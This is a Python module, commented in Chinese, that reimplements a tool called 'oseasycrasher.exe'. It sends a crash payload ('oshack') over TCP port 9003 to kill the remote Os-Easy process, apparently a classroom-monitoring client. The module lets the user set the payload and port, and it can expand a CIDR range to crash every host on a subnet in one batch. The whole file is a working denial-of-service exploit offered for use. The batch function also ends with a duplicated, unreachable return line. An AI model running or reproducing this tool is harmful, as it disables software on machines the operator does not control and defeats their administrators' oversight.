# src/modules/remote_crasher.py
# 远程崩溃模块 —— 按 IP 发送崩溃载荷触发远端 Os-Easy 进程终止
#
# 对应原版释放物 oseasycrasher.exe：
#   - 用法：oseasycrasher.exe <ip>
#   - 实现：WSAStartup -> 创建 TCP socket -> connect(<ip>) -> 发送 payload
#   - 反汇编证据：Kill target: %s / [*]Sending Test Payload... / Connection code %d
#
# 本模块用纯 Python/socket 复刻同一套"按 IP 发送载荷触发远端崩溃"流程，
# 并把"载荷内容""目标端口"开放为可配置参数。

import ipaddress
import socket
import time

from src.utils.system.logger import info, warn, error, debug

# 目标端口（学生端监听的控制通道，实测 ConnectPort=9003 可触发崩溃）
DEFAULT_PORT = 9003
DEFAULT_TIMEOUT = 3.0    # 连接/收发超时
# 发送到目标机的崩溃/控制指令载荷（原版通过自定义协议；此处开放给配置）
DEFAULT_PAYLOAD = b"oshack\r\n"


def parse_payload(text: str) -> bytes:
    """把用户输入的载荷文本转成原始字节。

    支持解释转义序列：\\r \\n \\t \\\\ \\xNN 等；
    文本为空时返回默认载荷。

    Args:
        text: 界面输入的载荷字符串。

    Returns:
        对应的原始字节载荷。
    """
    text = (text or "").strip()
    if not text:
        return DEFAULT_PAYLOAD
    try:
        # 先按 utf-8 解码成字符，再解释 \r \n \x 等转义，最后转回 latin1 字节
        return text.encode("utf-8").decode("unicode_escape").encode("latin1")
    except Exception:
        return text.encode("utf-8")


def expand_cidr(cidr: str):
    """展开网段字符串为 IP 列表；非合法网段则原样返回。"""
    try:
        net = ipaddress.ip_network(cidr.strip(), strict=False)
        hosts = [str(h) for h in net.hosts()]
        debug(f"网段 {cidr.strip()} 展开为 {len(hosts)} 台主机")
        return hosts
    except ValueError:
        warn(f"网段格式无效，按单 IP 处理: {cidr.strip()}")
        return [cidr.strip()]


def crash(ip: str, port: int = DEFAULT_PORT, payload: bytes = DEFAULT_PAYLOAD,
          timeout: float = DEFAULT_TIMEOUT) -> str:
    """按 IP 对远程主机发送崩溃载荷。

    Args:
        ip:     目标主机 IP。
        port:   目标端口。
        payload:要发送的原始字节载荷。
        timeout:连接/收发超时。

    Returns:
        结果描述字符串。
    """
    ip = (ip or "").strip()
    if not ip:
        warn("远程崩溃：未提供目标 IP，已跳过")
        return "未提供目标 IP"
    try:
        port = int(port or DEFAULT_PORT)
    except (TypeError, ValueError):
        error(f"远程崩溃：端口无效: {port}")
        return f"端口无效: {port}"

    debug(f"远程崩溃 开始 → 目标 {ip}:{port}，载荷 {len(payload)} 字节 [{payload!r}]，超时 {timeout}s")
    t0 = time.perf_counter()
    try:
        sock = socket.create_connection((ip, port), timeout=timeout)
        conn_ms = (time.perf_counter() - t0) * 1000
        debug(f"TCP 连接建立成功 {ip}:{port}（耗时 {conn_ms:.0f}ms）")
        try:
            sock.sendall(payload)
            debug(f"已发送载荷 {len(payload)} 字节到 {ip}:{port}")
            # 尝试读取响应，非必须
            try:
                resp = sock.recv(64)
                extra = f"，收到响应 {len(resp)} 字节" if resp else "，无响应"
                if resp:
                    debug(f"收到响应 {len(resp)} 字节: {resp!r}")
            except socket.timeout:
                extra = "（发送完成，等待响应超时）"
                debug("等待响应超时（预期内，载荷已送达）")
            msg = f"远程崩溃指令已发送到 {ip}:{port}{extra}"
            info(msg)
            return msg
        finally:
            sock.close()
            debug(f"已关闭与 {ip}:{port} 的连接")
    except socket.timeout:
        el = (time.perf_counter() - t0) * 1000
        warn(f"连接 {ip}:{port} 超时（{timeout}s），发送失败（耗时 {el:.0f}ms）")
        return f"连接 {ip}:{port} 超时，发送失败"
    except socket.gaierror as exc:
        error(f"无法解析主机 {ip}: {exc}")
        return f"无法解析主机 {ip}"
    except OSError as exc:
        el = (time.perf_counter() - t0) * 1000
        warn(f"连接 {ip}:{port} 失败: {exc}（耗时 {el:.0f}ms）")
        return f"连接 {ip}:{port} 失败: {exc}"


def crash_targets(ips, port: int = DEFAULT_PORT,
                  payload: bytes = DEFAULT_PAYLOAD) -> str:
    """对多个 IP 批量发送崩溃载荷。

    Args:
        ips:  IP 列表。

    Returns:
        结果摘要字符串。
    """
    ips = list(ips)
    debug(f"远程崩溃 批量开始 → 共 {len(ips)} 台，端口 {port}")
    t0 = time.perf_counter()
    ok, fail = 0, 0
    details = []
    for i, ip in enumerate(ips, 1):
        debug(f"--- 批量进度 [{i}/{len(ips)}] {ip} ---")
        r = crash(ip, port, payload)
        if "发送" in r and "失败" not in r:
            ok += 1
        else:
            fail += 1
        details.append(f"{ip}: {r}")
    el = time.perf_counter() - t0
    info(f"远程崩溃批量完成：成功 {ok} 台，失败 {fail} 台，总耗时 {el:.2f}s")
    # 只把失败项写日志，避免刷屏
    for d in details:
        if "失败" in d or "超时" in d:
            warn(d)
    return f"批量远程崩溃：成功 {ok} 台，失败 {fail} 台"
    return f"批量远程崩溃：成功 {ok} 台，失败 {fail} 台"
